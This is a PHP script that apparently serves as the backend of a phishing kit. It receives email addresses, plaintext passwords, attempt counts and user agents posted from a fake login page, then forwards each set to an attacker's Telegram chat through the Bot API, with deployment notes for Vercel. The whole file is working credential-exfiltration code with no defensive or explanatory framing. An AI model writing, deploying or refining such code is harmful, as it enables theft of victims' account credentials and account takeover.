<?php
// 1. Headers & CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { exit; }

// 2. Data Parsing
$json = file_get_contents('php://input');
$data = json_decode($json, true);

if ($data && !empty($data['email'])) {
    // Sanitize input
    $email = htmlspecialchars($data['email']);
    $pass  = htmlspecialchars($data['password']);
    $try   = htmlspecialchars($data['attempt'] ?? '1');
    $ua    = htmlspecialchars($data['userAgent'] ?? $_SERVER['HTTP_USER_AGENT']);

    // 3. Environment Variables (Set these in Vercel Dashboard)
    $apiToken = getenv('TELEGRAM_TOKEN'); 
    $chatId   = getenv('TELEGRAM_CHAT_ID');
    
    // Correct URL construction for Telegram Bot API
    $url = "https://api.telegram.org/bot" . $apiToken . "/sendMessage";

    $message = "<b>🚀 LOGIN ATTEMPT</b>\n\n";
    $message .= "📧 <b>Email:</b> <code>$email</code>\n";
    $message .= "🔑 <b>Pass:</b> <code>$pass</code>\n\n";
    $message .= "🔢 <b>Attempt:</b> #$try\n";
    $message .= "💻 <b>Device:</b> $ua";

    $postData = [
        'chat_id'    => $chatId,
        'text'       => $message,
        'parse_mode' => 'HTML' 
    ];

    // 4. Send via cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    echo json_encode([
        'success' => ($httpCode == 200),
        'status' => ($httpCode == 200) ? 'Message Sent' : 'Telegram Error'
    ]);
} else {
    echo json_encode(['success' => false, 'message' => 'Waiting for POST data.']);
}
